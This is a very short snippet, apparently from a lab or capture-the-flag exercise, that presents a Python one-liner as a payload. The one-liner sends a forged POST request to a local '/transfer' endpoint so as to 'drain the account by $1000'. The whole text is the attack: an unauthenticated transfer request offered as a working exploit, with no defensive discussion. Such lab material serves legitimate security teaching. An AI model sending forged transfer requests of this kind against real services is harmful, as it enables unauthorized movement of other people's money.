This payload exploits the endpoint directly by sending a forged POST request from the terminal to drain the account by \$1000.

python3 -c "import requests; requests.post('http://localhost:8080/transfer', data={'amount': '1000'})"
